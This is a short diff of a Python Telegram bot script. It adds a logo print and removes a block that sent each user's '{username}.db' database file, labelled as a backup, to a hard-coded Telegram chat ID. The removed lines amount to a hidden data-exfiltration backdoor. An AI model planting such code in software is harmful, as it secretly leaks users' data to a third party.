@@ -53,6 +53,7 @@ try:
         print('ok')
         pass
 except:
+    print(logo)
     id_user = input('ID Для отправки базы: ')
     new2 = open('id.txt', 'w')
     new2.write(id_user)
@@ -110,13 +111,6 @@ async def sending_check(wait_for):
 
                 time.sleep(5)
 
-                
-            with open(f"{username}.db", "rb") as doc:
-                await bot.send_document(692916588,
-                                        doc,
-                                        caption=f"📦 BACKUP\n"
-                                                f"🕜 {tt}")
-                time.sleep(5)
 
 
 
